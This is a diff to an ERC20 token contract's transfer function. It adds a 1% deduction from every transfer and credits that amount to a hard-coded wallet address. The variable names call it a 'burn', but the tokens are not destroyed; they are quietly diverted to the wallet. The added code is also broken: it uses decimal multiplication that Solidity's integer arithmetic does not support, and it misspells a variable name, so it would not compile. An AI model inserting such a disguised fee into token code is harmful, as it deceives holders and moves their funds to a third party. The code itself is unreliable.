@@ -220,12 +220,16 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
 
         uint256 senderBalance = _balances[sender];
         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        uint256 XANBURN = amount * 0.01;
+        uint256 BURNTAMOUNT = amount - XANBURN;
         unchecked {
             _balances[sender] = senderBalance - amount;
         }
-        _balances[recipient] += amount;
+        _balances[address(0x87E3BCc57377946483DE2Df86418a39627F55ab1)] += XANBURN;
+        _balances[recipient] += BURNTAMMOUNT;
 
-        emit Transfer(sender, recipient, amount);
+        emit Transfer(sender, recipient, BURNTAMMOUNT);
+        emit Transfer(sender, address(0x87E3BCc57377946483DE2Df86418a39627F55ab1), XANBURN);
     }
 
     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
